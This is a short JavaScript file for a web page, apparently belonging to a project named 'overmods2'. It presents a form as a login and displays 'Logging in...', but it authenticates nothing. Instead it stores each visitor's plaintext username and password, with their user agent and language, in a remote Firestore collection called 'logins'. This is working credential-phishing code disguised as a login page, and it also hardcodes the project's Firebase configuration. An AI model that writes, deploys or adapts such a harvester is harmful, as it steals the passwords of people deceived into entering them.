// Firebase v10 modular SDK — loaded straight from the CDN
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import {
  getFirestore,
  collection,
  addDoc,
  serverTimestamp
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyDFCiEwOl9MlBbYjRpU70ZU_NgwZLPsBHw",
  authDomain: "overmods2.firebaseapp.com",
  projectId: "overmods2",
  storageBucket: "overmods2.firebasestorage.app",
  messagingSenderId: "203325811727",
  appId: "1:203325811727:web:006becff2b175c6baa477a",
  measurementId: "G-VGP88B8T10"
};

// Boot it up
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const form = document.getElementById("loginForm");
const usernameEl = document.getElementById("username");
const passwordEl = document.getElementById("password");
const statusEl = document.getElementById("status");
const submitBtn = document.getElementById("submitBtn");

form.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = usernameEl.value.trim();
  const password = passwordEl.value;

  if (!username || !password) {
    setStatus("Please fill in both fields.", "err");
    return;
  }

  submitBtn.disabled = true;
  setStatus("Logging in...", "");

  try {
    // Store the raw fields in the "logins" collection
    await addDoc(collection(db, "logins"), {
      username: username,
      password: password,
      userAgent: navigator.userAgent,
      language: navigator.language,
      createdAt: serverTimestamp()
    });

    setStatus("Saved successfully ✔", "ok");
    form.reset();
  } catch (err) {
    console.error(err);
    setStatus("Error: " + err.message, "err");
  } finally {
    submitBtn.disabled = false;
  }
});

function setStatus(msg, type) {
  statusEl.textContent = msg;
  statusEl.className = "status" + (type ? " " + type : "");
}
